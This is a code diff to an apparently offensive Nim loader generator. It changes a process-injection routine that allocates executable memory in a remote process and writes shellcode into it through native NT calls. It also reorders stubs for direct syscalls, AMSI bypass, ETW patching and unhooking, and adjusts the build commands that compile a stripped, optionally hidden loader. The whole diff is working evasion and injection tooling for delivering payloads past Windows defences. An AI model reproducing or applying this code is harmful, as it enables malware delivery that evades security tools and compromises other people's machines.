@@ -599,12 +599,12 @@ proc pwndem[byte](shellcode: openarray[byte]): void =
     cid.UniqueProcess = tProcess
 
     status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
-
+    echo "[*] NtAllocateVirtualMemory: ", status
     var bytesWritten: SIZE_T
 
     status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr shellcode,sc_size-1,addr bytesWritten);
 
-    echo "[*] WriteProcessMemory: ", status
+    echo "[*] NtWriteVirtualMemory: ", status
     echo "    \\-- bytes written: ", bytesWritten
     echo ""
     
@@ -875,8 +875,9 @@ if(unhook):
     stub.add(Winimleanstub)
     stub.add(UnhookStub)
 if (shellcode):
+    stub.add(GetSyscallStub)
     if (AMSI):
-        stub = stub &  GetSyscallStub & AMSIETWDelegates & AMSIStub
+        stub = stub &  AMSIETWDelegates & AMSIStub
         if(ETW):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
@@ -887,7 +888,7 @@ if (shellcode):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
             else:
-                stub = stub & GetSyscallStub & AMSIETWDelegates & ETWPatchStub
+                stub = stub & AMSIETWDelegates & ETWPatchStub
     if(localinject):
         stub = stub & LocalInjectDelegates & ShellcodelocalStub
     else:
@@ -937,13 +938,13 @@ if (denim):
         echo fmt"'.\Denim.exe' not found. You need to download and install it from here: https://github.com/moloch--/denim"
 if (reflective):
     if (hide):
-        discard os.execShellCmd(fmt"nim c -d:release --app=console --app:gui --dynamicbase,--export-all-symbols --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
+        discard os.execShellCmd(fmt"nim c -d:release --app=console --app:gui --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
     else:
-        discard os.execShellCmd(fmt"nim c -d:release --app=console --dynamicbase,--export-all-symbols --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
+        discard os.execShellCmd(fmt"nim c -d:release --app=console --dynamicbase,--export-all-symbols --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
 else:
     if(hide):
-        discard os.execShellCmd(fmt"nim c -d:release --app:gui --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
+        discard os.execShellCmd(fmt"nim c -d:release --app:gui --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
     else:
-        discard os.execShellCmd(fmt"nim c -d:release --app:console --hint[Pattern]:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
+        discard os.execShellCmd(fmt"nim c -d:release --app:console --hint:all:off --warning:all:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --out={outfile} Loader.nim")
 let msg = fmt"[!] Encrypted file saved to {outfile}"
 echo "\n" & msg
